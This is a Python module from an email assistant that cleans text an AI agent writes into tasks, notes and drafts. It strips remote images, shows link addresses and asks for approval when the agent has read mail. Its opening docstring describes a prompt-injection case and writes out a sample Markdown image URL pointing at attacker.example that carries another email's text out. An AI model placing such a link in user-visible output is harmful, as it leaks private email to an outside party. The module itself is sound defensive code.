"""Free text an agent writes where the user reads it later: task titles and notes, event
descriptions, drafts and briefs.

An instruction injected into an email can make a model put
`![receipt](https://attacker.example/p.png?d=<text from another email>)` into a task's notes or a
draft; the browser then sends that text out the moment the user looks. So:

- images never survive: a Markdown image becomes its alt text, an HTML <img> with a remote
  source is removed (drafts keep cid: and data: images, which load nothing);
- for the built-in assistant, a link must appear in what the model read this turn
  (intel/citations.verify_links); other links become plain text naming their host;
- in a draft, a link whose text is not its address shows the address beside it (reveal_links_html);
- writes of such text ask first (`ask_by_default`, so a user's own allow rule still applies)
  when the agent is an API token or the assistant's turn has read mail (ToolCtx.untrusted);
- in a chat that has read local-only content (ToolCtx.session_sensitive), a write that would copy
  it where hosted models read it always asks (`local_copy_reason`, a forced ask), for items with
  no local-only mark of their own: tasks, skills, briefs, drafts on ordinary accounts, calendar
  writes to calendars of ordinary accounts (calendar_common.calendar_local_copy_reason) and Speakr
  writes to ordinary Speakr accounts. Notes,
  tables and memory are marked local-only (sensitive) instead.
"""

from __future__ import annotations

import re
from typing import Any

TAINTED = "hard rule: an agent wrote this text after reading email (or through an API token), so it asks first"

_MD_IMAGE = re.compile(r"!\[([^\]\n]*)\]\(\s*<?[^)\n]*\)")
_MD_REF_IMAGE = re.compile(r"!\[([^\]\n]*)\]\[[^\]\n]*\]")
_HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)
_SRC = re.compile(r"""\bsrc\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))""", re.I)
_SAFE_SRC = ("cid:", "data:image/")


LOCAL_COPY = ("hard rule: this chat has read local-only content, and this would copy it where hosted models can "
              "read it, so it asks first")


def local_copy_reason(ctx) -> str | None:
    """Why an assistant write asks first because its chat has read local-only content, or None."""
    if not getattr(ctx, "assistant", False) or ctx.actor.kind == "user" or not ctx.session_sensitive:
        return None
    return LOCAL_COPY


def taint_reason(ctx) -> str | None:
    """Why an agent's free-text write asks first, or None (the signed-in user's own request, or
    an assistant turn that has read no mail)."""
    if ctx.actor.kind == "user":
        return None
    if ctx.p.is_token or ctx.untrusted:
        return TAINTED
    return None


def strip_markdown_images(text: str) -> str:
    """Markdown and HTML images in plain or Markdown text become their alt text."""
    if not text:
        return text
    t = _MD_IMAGE.sub(lambda m: f"[image: {m.group(1)}]" if m.group(1).strip() else "[image]", text)
    t = _MD_REF_IMAGE.sub(lambda m: f"[image: {m.group(1)}]" if m.group(1).strip() else "[image]", t)
    return _HTML_IMG.sub("[image]", t)


def strip_remote_images_html(html: str) -> str:
    """Remove <img> elements whose source loads something (anything but cid: and data:image/)."""
    if not html or "<img" not in html.lower():
        return html

    def one(m: re.Match) -> str:
        src = _SRC.search(m.group(0))
        val = next((g for g in src.groups() if g is not None), "") if src else ""
        return m.group(0) if val.strip().lower().startswith(_SAFE_SRC) else ""

    return _HTML_IMG.sub(one, html)


_HTML_LINK = re.compile(r"""<a\b[^>]*?\bhref\s*=\s*(?:"([^"]*)"|'([^']*)')[^>]*>(.*?)</a\s*>""", re.I | re.S)
_TAGS = re.compile(r"<[^>]+>")


def _bare(url: str) -> str:
    u = url.strip().lower()
    for prefix in ("mailto:", "https://", "http://", "www."):
        u = u.removeprefix(prefix)
    return u.rstrip("/")


def reveal_links_html(html: str) -> str:
    """Every link whose text is not its own address gets the address beside it, "text (address)",
    so a draft's reader sees where a link goes before sending (an injected "[your bank](https://…)")."""
    if not html or "<a" not in html.lower():
        return html
    import html as htmllib

    def one(m: re.Match) -> str:
        url = htmllib.unescape(m.group(1) if m.group(1) is not None else m.group(2) or "")
        shown = htmllib.unescape(_TAGS.sub("", m.group(3) or "")).strip()
        note = f" ({htmllib.escape(url.removeprefix('mailto:'), quote=False)})"
        after = _TAGS.sub("", m.string[m.end():m.end() + 4 * len(note) + 100])
        if not url or _bare(shown) == _bare(url) or after.startswith(note):
            return m.group(0)  # its own address, or shown already (an edit of a draft)
        return m.group(0) + note

    return _HTML_LINK.sub(one, html)


def clean_text(ctx, text: Any) -> Any:
    """An agent's plain or Markdown text, made safe to show: no images, and for the built-in
    assistant only links it read this turn."""
    if not isinstance(text, str) or not text:
        return text
    t = strip_markdown_images(text)
    known = getattr(ctx, "known", None)
    if known is not None and "http" in t:
        from mailr.intel.citations import verify_links

        t = verify_links(t, known())
    return t
